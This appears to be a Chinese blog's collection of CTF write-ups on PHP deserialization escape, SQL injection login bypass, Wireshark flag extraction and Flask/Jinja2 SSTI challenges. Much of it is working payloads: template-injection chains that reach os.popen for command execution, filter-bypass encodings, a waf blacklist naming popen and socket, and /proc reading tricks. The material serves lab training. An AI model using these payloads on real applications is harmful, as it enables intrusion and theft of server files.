<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3BO%3A3%3A%22one%22%3A1%3A%7Bs%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22%00third%00string%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A6%3A%22object%22%3BN%3Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7D%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="ctfshow-web1-此夜圆"><a href="#ctfshow-web1-此夜圆" class="headerlink" title="ctfshow_web1_此夜圆"></a>ctfshow_web1_此夜圆</h2><p>反序列化字符串逃逸<br>源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname=$uname;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">            if($this-&gt;password===&#x27;yu22x&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                include(&#x27;flag.php&#x27;);</span><br><span class="line">                echo $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &#x27;wrong password&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[1];</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>目标调用wakeup时paswword=yu22x<br>存在反序列化逃逸，每有一个Firebasky可逃逸2字符<br>序列化结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;N;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;s:1:&quot;a&quot;;</span><br></pre></td></tr></table></figure>
<p>需要逃逸30字节<br>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskys:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>获得flag</p>
<h2 id="buuctf-wireshark"><a href="#buuctf-wireshark" class="headerlink" title="buuctf_wireshark"></a>buuctf_wireshark</h2><p>简单的工具实践<br>将流量包放入wireshark中<br>匹配post包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ffb7567a1d4f4abdffdb54e022f8facd&#125;</span><br></pre></td></tr></table></figure>
<h2 id="buuctf-流量嗅探"><a href="#buuctf-流量嗅探" class="headerlink" title="buuctf_流量嗅探"></a>buuctf_流量嗅探</h2><p>将流量放入wireshark<br>寻找http包<br>发现图片上传<br>在图片尾部找到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;da73d88936010da1eeeb36e945ec4b97&#125;</span><br></pre></td></tr></table></figure>
<h2 id="【GXYCTF2019】baby-SQLi"><a href="#【GXYCTF2019】baby-SQLi" class="headerlink" title="【GXYCTF2019】baby SQLi"></a>【GXYCTF2019】baby SQLi</h2><p>在search页面发现源码：<code>select * from user where username = &#39;$name</code><br>登录口过滤了<code>（）=</code><br>登录admin<br>返回<code>wrong pass</code>可知存在admin，那题目大概就是登录admin获取flag<br>用admin测试回显点 1’ union select 1,’admin’,3#<br><code>union select</code>在查找失败后会创造一个虚拟的数据，可以通过这一特性更改admin的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user:1&#x27; union select 1,&#x27;admin&#x27;,&#x27;123&#x27;#</span><br><span class="line">passwd:123</span><br></pre></td></tr></table></figure>
<p>失败<br>尝试用MD5的密码值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user：1&#x27; union select 1,&#x27;admin&#x27;,&#x27;202cb962ac59075b964b07152d234b70&#x27;#</span><br><span class="line">passwd：123</span><br></pre></td></tr></table></figure>
<p>成功登录，获得flag</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/03/2022-3-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/03/2022-3-3/" class="post-title-link" itemprop="url">2022.3.3</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-03 18:34:29" itemprop="dateCreated datePublished" datetime="2022-03-03T18:34:29+08:00">2022-03-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-09 19:08:30" itemprop="dateModified" datetime="2022-03-09T19:08:30+08:00">2022-03-09</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="web-ssti-flask"><a href="#web-ssti-flask" class="headerlink" title="web-ssti-flask"></a>web-ssti-flask</h1><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>一道初级的ssti题目，<br>打开靶机，页面提示使用<code>search</code>注入<br>尝试使用<code>&#123;&#123;9*9&#125;&#125;</code>回显81，证明存在ssti漏洞，尝试利用漏洞。<br>尝试查询类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f8aa304e-ac57-4d8a-8594-1bbcb64c2bb8.node4.buuoj.cn:81/?search=&#123;&#123;&#x27;&#x27;.__class__.&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>查询父类，不是<code>object</code>，再次向上查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f8aa304e-ac57-4d8a-8594-1bbcb64c2bb8.node4.buuoj.cn:81/?search=&#123;&#123;&#x27;&#x27;.__class__.__base__.__base__&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>使用脚本寻找可用类，脚本多次寻找失败，考虑输入过滤或禁用。<br>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>,<span class="number">400</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    url=<span class="string">&quot;http://f8aa304e-ac57-4d8a-8594-1bbcb64c2bb8.node4.buuoj.cn:81/?search=&#123;&#123;&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[%d].__init__[&#x27;__glob&#x27;+&#x27;als__&#x27;]&#125;&#125;&quot;</span></span><br><span class="line">    response=res.get(url%i)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">len</span>(response.text),i,response.status_code)</span><br></pre></td></tr></table></figure>
<p>直接输入文本形式，发现拒绝访问<br>对<code>globals</code>进行了过滤<br>使用python的字符串拼接功能，成功绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://f8aa304e-ac57-4d8a-8594-1bbcb64c2bb8.node4.buuoj.cn:81/?search=&#123;&#123;&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[71].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>查询<code>os</code>功能，如果存在<code>&#39;os&#39;: &lt;module &#39;os&#39; from &#39;/usr/lib/python2.7/os.pyc&#39;&gt;</code>，无需引入os功能<br>使用popen功能实现任意命令执行。<br>如果显示<code>OSERRO</code>，可利用<code>__builtins__</code>类实现任意命令执行。<br>需要自行加入os</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;**find / -name *flag***&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>进入flasklight目录，发现flag文件，打开后获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bbe55e8c-86ed-4a05-b431-dfbb9c9a8939.node4.buuoj.cn:81/?search=&#123;&#123;&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[60].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flasklight/coomme_geeeett_youur_flek &#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>一步到位注入程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">	&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; </span><br><span class="line">		&#123;% for b in c.__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;].values() %&#125; </span><br><span class="line">        	&#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; </span><br><span class="line">            	&#123;% if &#x27;eval&#x27; in b.keys() %&#125; </span><br><span class="line">                	&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;) &#125;&#125; </span><br><span class="line">                &#123;% endif %&#125; </span><br><span class="line">            &#123;% endif %&#125; </span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125; </span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>一个进行base64加密的flask小程序，存在输入的地方就可能存在注入点。<br>加密页面没有注入问题，但在解密界面尝试<code>&#123;&#123;9*9&#125;&#125;</code>后报错，发现该程序启用了debug模式，可以看到出错处的程序。<br>泄露源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/decode&#x27;,methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])</span><br><span class="line"></span><br><span class="line">def decode():</span><br><span class="line"></span><br><span class="line">    if request.values.get(&#x27;text&#x27;) :</span><br><span class="line"></span><br><span class="line">        text = request.values.get(&quot;text&quot;)</span><br><span class="line"></span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line"></span><br><span class="line">        tmp = &quot;结果 ： &#123;0&#125;&quot;.format(text_decode.decode())</span><br><span class="line"></span><br><span class="line">        if waf(tmp) :</span><br><span class="line"></span><br><span class="line">            flash(&quot;no no no !!&quot;)</span><br><span class="line"></span><br><span class="line">            return redirect(url_for(&#x27;decode&#x27;))</span><br><span class="line"></span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure>
<p>审计代码，输入一个base64字符串，解码后经过waf的过滤后进入res函数。<br>制作一个fuzz脚本检测waf函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">from time import sleep</span><br><span class="line">import base64 as b64</span><br><span class="line">import requests as res</span><br><span class="line">for i in range(33,125):</span><br><span class="line">    sleep(0.3)</span><br><span class="line">    url=&quot;http://99d49261-2fc3-49c1-8aee-6e883e57409b.node4.buuoj.cn:81/decode?text=%s&quot;</span><br><span class="line">    eurl=str(b64.b64encode((bytes([i]))))</span><br><span class="line">    response=res.get(url%eurl)</span><br><span class="line">    if(&quot;no no no !!&quot; in response.text):</span><br><span class="line">        print(i)</span><br><span class="line">    print(response.url)</span><br><span class="line">    print(len(response.text),i,response.status_code,eurl,chr(i))</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>使用<code>config</code>类最简单的payload尝试获取源码<br>得到waf的黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] </span><br></pre></td></tr></table></figure>
<p>使用<code>os</code>的内置函数列目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].listdir(&#x27;/&#x27;)&#125;&#125;</span><br><span class="line">e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydvJysncyddLmxpc3RkaXIoJy8nKX19</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&amp;#39;bin&amp;#39;, &amp;#39;boot&amp;#39;, &amp;#39;dev&amp;#39;, &amp;#39;etc&amp;#39;, &amp;#39;home&amp;#39;, &amp;#39;lib&amp;#39;, &amp;#39;lib64&amp;#39;, &amp;#39;media&amp;#39;, &amp;#39;mnt&amp;#39;, &amp;#39;opt&amp;#39;, &amp;#39;proc&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;run&amp;#39;, &amp;#39;sbin&amp;#39;, &amp;#39;srv&amp;#39;, &amp;#39;sys&amp;#39;, &amp;#39;tmp&amp;#39;, &amp;#39;usr&amp;#39;, &amp;#39;var&amp;#39;, &amp;#39;this_is_the_flag.txt&amp;#39;, &amp;#39;.dockerenv&amp;#39;, &amp;#39;app&amp;#39;] </span><br></pre></td></tr></table></figure>
<p>利用<code>open</code>函数获取flag，使用拼接绕过<code>os</code>和<code>flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">e3tjb25maWcuX19jbGFzc19fLl9faW5pdF9fLl9fZ2xvYmFsc19fWydfX2J1aWx0aW5zX18nXS5vcGVuKCcvdGhpc19pc190aGVfZmwnKydhZy50eHQnKS5yZWFkKCl9fQ==</span><br></pre></td></tr></table></figure>
<p>直接获得flag</p>
<h2 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>没有什么参数提示<br>使用工具进行爆破<br>参数爆破工具arjun：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 arjun -u http://270ecd40-84d3-4667-bee9-04c7c2aeb5c2.node3.buuoj.cn/ -c 100 -d 5</span><br></pre></td></tr></table></figure>
<p>存在ssti漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__base__.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I ♥ Flask &amp; &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt; </span><br></pre></td></tr></table></figure>
<p>确认是jinja2的模板<br>没有进行关键的过滤，所以直接使用最简的啊payload<br>查询目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].listdir()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>发现flag.txt文件<br>直接open文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="pasecactf-2019-flask-ssti-1"><a href="#pasecactf-2019-flask-ssti-1" class="headerlink" title="[pasecactf_2019]flask_ssti 1"></a>[pasecactf_2019]flask_ssti 1</h2><p>buuj的题目出现了点问题，只有直接post才能发送请求<br>尝试ssti</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname=&#123;&#123;9*9&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>成功，但存在过滤<br>寻找过滤符号<br>过滤了<code>&#123;&#123;''&#125;&#125; &#123;&#123;_&#125;&#125; &#123;&#123;.&#125;&#125;</code><br>分别使用<code>&#123;&#123;""&#125;&#125; &#123;&#123;\x5f&#125;&#125; &#123;&#123;[]&#125;&#125;</code>绕过<br>查看当前文件夹下的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>没有找到flag的可疑文件，查看源码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&#123;&#123;config[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;cat app\x2epy&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[♥♥♥payload：import random from flask import Flask, render_template_string, render_template, request import os app = Flask(__name__) app.config[&#x27;SECRET_KEY&#x27;] = &#x27;folow @osminogka.ann on instagram =)&#x27; #Tiaonmmn don&#x27;t remember to remove this part on deploy so nobody will solve that hehe &#x27;&#x27;&#x27; def encode(line, key, key2): return &#x27;&#x27;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line))) app.config[&#x27;flag&#x27;] = encode(&#x27;&#x27;, &#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;, &#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;) &#x27;&#x27;&#x27; def encode(line, key, key2): return &#x27;&#x27;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line))) file = open(&quot;/app/flag&quot;, &quot;r&quot;) flag = file.read() flag = flag[:42] app.config[&#x27;flag&#x27;] = encode(flag, &#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;, &#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;) flag = &quot;&quot; os.remove(&quot;/app/flag&quot;) nicknames = [&#x27;˜”*°★☆★_%s_★☆★°°*&#x27;, &#x27;%s ~♡ⓛⓞⓥⓔ♡~&#x27;, &#x27;%s Вêчңø в øĤлâйĤé&#x27;, &#x27;♪ ♪ ♪ %s ♪ ♪ ♪ &#x27;, &#x27;[♥♥♥%s♥♥♥]&#x27;, &#x27;%s, kOтO®Aя )(оТеЛ@ ©4@$tьЯ&#x27;, &#x27;♔%s♔&#x27;, &#x27;[♂+♂=♥]%s[♂+♂=♥]&#x27;] @app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def index(): if request.method == &#x27;POST&#x27;: try: p = request.values.get(&#x27;nickname&#x27;) id = random.randint(0, len(nicknames) - 1) if p != None: if &#x27;.&#x27; in p or &#x27;_&#x27; in p or &#x27;\&#x27;&#x27; in p: return &#x27;Your nickname contains restricted characters!&#x27; return render_template_string(nicknames[id] % p) except Exception as e: print(e) return &#x27;Exception&#x27; return render_template(&#x27;index.html&#x27;) if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=1337) ♥♥♥]</span><br></pre></td></tr></table></figure>
<p>这个源码太抽象了<br>大概功能就是将flag文件读取进来后进行加密异或运算，在将密文存储在config中，最后把flag.txt删掉了</p>
<h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>由于是通过异或求得的，通过相同的步骤可以直接复原<br>获得密文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#x27;flag&#x27;: &#x27;-M7\x10wG0&gt;3\x07%a~\x0e\x1c\x0bn\x07(D\x10\x1a\\\x17!j\x051\x02\r\x12Y&quot;\x03#|@;\x10\t\x1fG&#x27;&#125;</span><br></pre></td></tr></table></figure>
<p>再次运行脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def encode(line, key, key2):</span><br><span class="line">    return &#x27;&#x27;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))</span><br><span class="line">flag=&#x27;-M7\x10wG0&gt;3\x07%a~\x0e\x1c\x0bn\x07(D\x10\x1a\\\x17!j\x051\x02\r\x12Y&quot;\x03#|@;\x10\t\x1fG&#x27;</span><br><span class="line">flag = encode(flag, &#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;, &#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>因为靶机在linux下运行，而flaskapp没有关闭，因此可以通过进程中的指令复原被删除的文件操作。</p>
<h4 id="proc目录"><a href="#proc目录" class="headerlink" title="/proc目录"></a>/proc目录</h4><p>*Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。<br>还有的是一些以数字命名的目录，他们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在/proc下，以进程的PID号为目录名，他们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link<br>*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al /proc</span><br></pre></td></tr></table></figure>
<h4 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h4><p><em>cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取cat进程的启动命令</span><br><span class="line">cat /proc/#pid#/cmdline</span><br></pre></td></tr></table></figure>
<h4 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h4><p><em>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录</em></p>
<h4 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h4><p><em>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径</em></p>
<h4 id="enciron"><a href="#enciron" class="headerlink" title="enciron"></a>enciron</h4><p><em>environ文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开，变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息：</em></p>
